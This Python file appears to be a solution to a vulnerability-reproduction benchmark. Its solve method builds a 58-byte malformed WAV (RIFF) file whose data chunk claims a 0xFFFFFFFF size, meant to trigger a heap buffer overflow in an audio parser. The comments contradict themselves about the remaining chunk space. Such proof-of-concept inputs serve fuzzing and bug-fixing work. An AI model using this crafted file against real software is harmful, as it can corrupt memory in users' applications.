import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a malformed RIFF file that triggers heap buffer overflow
        # Structure: RIFF header + malformed chunk
        
        # RIFF header (12 bytes)
        riff_header = b'RIFF'
        
        # File size minus 8 bytes (will be 50 for 58 byte file)
        # We'll craft a file that's exactly 58 bytes
        total_file_size = 58
        riff_size = struct.pack('<I', total_file_size - 8)  # 50 = 0x32
        
        # Format type
        format_type = b'WAVE'
        
        # First chunk header (fmt chunk - normally 16 bytes of data)
        fmt_chunk_id = b'fmt '
        # Set fmt chunk size to 16 (normal for PCM WAV)
        fmt_chunk_size = struct.pack('<I', 16)
        
        # PCM format data (16 bytes)
        # Format code (1 = PCM), channels (1), sample rate (44100), 
        # byte rate (88200), block align (2), bits per sample (16)
        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
        
        # Create a data chunk with malformed size
        data_chunk_id = b'data'
        
        # The vulnerability: data size not checked against RIFF chunk end
        # Make data size larger than remaining space in RIFF chunk
        # RIFF chunk size is 50, we've used: 12 (RIFF header) + 8 (fmt header) + 16 (fmt data) + 8 (data header) = 44 bytes
        # Remaining in RIFF: 50 - (44 - 8) = 14 bytes (subtract 8 because RIFF size doesn't include 'RIFF' and size fields)
        # Actually: RIFF size is 50, we've written: 4 (fmt) + 4 (fmt size) + 16 (fmt data) + 4 (data) + 4 (data size) = 32 bytes of chunk data
        # So we have 50 - 32 = 18 bytes left in RIFF chunk
        # Make data size larger than available space to trigger overflow
        
        # We'll make data size 0xFFFFFFFF (max uint32) to definitely overflow
        data_chunk_size = struct.pack('<I', 0xFFFFFFFF)
        
        # Put some initial data (can be anything)
        initial_data = b'A' * 10  # 10 bytes of data
        
        # Combine all parts
        poc_bytes = (
            riff_header +
            riff_size +
            format_type +
            fmt_chunk_id +
            fmt_chunk_size +
            fmt_data +
            data_chunk_id +
            data_chunk_size +
            initial_data
        )
        
        # Pad to exactly 58 bytes to match ground truth
        if len(poc_bytes) < total_file_size:
            poc_bytes += b'\x00' * (total_file_size - len(poc_bytes))
        elif len(poc_bytes) > total_file_size:
            poc_bytes = poc_bytes[:total_file_size]
            
        return poc_bytes